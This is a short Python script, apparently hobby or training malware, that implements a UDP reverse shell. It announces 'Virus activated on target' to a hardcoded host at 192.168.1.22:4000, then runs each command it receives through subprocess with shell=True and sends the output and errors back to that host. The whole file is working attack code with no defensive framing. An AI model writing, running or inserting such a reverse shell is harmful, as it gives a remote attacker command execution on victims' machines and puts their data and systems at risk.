import socket
import time
import os
import subprocess


"""
Class designed to get commands from a remote server and execute them on the local machine.
"""
class ReverseShell:


    """
    Initializes server address and client socket.
    """
    def __init__(self, serverIP, serverPort):

        self.isRunning      = True
        self.serverAddress  = (serverIP, serverPort)
        self.client         = socket.socket(family=socket.AF_INET, type=socket.SOCK_DGRAM)


    """
    Executes a command and send back the output/error message of the command.
    """
    def executeOrder(self, order):

        command = subprocess.Popen(order.split(" "), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
        output, error = command.communicate()

        if output is not None and len(output) > 0:

            self.client.sendto(str.encode("[output]\n") + output + str.encode("\n"), self.serverAddress)

        if error is not None and len(error) > 0:

            self.client.sendto(str.encode("[error]\n") + error + str.encode("\n"), self.serverAddress)


    """
    Main loop : sends a first message to let the server know the client is available then wait for orders to execute.
    """
    def run(self):

        self.client.sendto(str.encode("Virus activated on target\n"), self.serverAddress)

        while self.isRunning:

            self.executeOrder(self.client.recvfrom(1024)[0])


"""
-----------------------------------------------------
"""
shell = ReverseShell("192.168.1.22", 4000)
shell.run()
